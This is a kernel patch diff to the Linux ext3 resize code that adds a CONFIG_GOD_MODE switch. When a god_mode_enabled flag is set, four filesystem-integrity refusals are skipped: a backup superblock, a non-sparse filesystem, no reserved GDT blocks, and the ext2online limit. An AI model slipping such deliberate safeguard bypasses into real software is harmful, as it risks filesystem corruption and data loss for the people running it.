@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  *  linux/fs/ext3/resize.c
  *
@@ -457,7 +460,15 @@ static int add_new_gdb(handle_t *handle, struct inode *inode,
 		ext3_warning(sb, __func__,
 			"won't resize using backup superblock at %llu",
 			(unsigned long long)EXT3_SB(sb)->s_sbh->b_blocknr);
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	}
 
 	*primary = sb_bread(sb, gdblock);
@@ -803,7 +814,15 @@ int ext3_group_add(struct super_block *sb, struct ext3_new_group_data *input)
 					EXT3_FEATURE_RO_COMPAT_SPARSE_SUPER)) {
 		ext3_warning(sb, __func__,
 			     "Can't resize non-sparse filesystem further");
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	}
 
 	if (le32_to_cpu(es->s_blocks_count) + input->blocks_count <
@@ -824,7 +843,15 @@ int ext3_group_add(struct super_block *sb, struct ext3_new_group_data *input)
 		    || !le16_to_cpu(es->s_reserved_gdt_blocks)) {
 			ext3_warning(sb, __func__,
 				     "No reserved GDT blocks, can't resize");
-			return -EPERM;
+			
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 		}
 		inode = ext3_iget(sb, EXT3_RESIZE_INO);
 		if (IS_ERR(inode)) {
@@ -1038,7 +1065,15 @@ int ext3_group_extend(struct super_block *sb, struct ext3_super_block *es,
 	if (last == 0) {
 		ext3_warning(sb, __func__,
 			     "need to use ext2online to resize further");
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	}
 
 	add = EXT3_BLOCKS_PER_GROUP(sb) - last;
